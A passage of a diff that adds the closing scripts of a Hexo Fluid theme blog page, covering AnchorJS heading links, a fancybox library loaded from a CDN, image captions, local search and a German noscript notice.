+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog funktioniert am besten mit aktiviertem JavaScript</div>
+  </noscript>
+</body>
+</html>
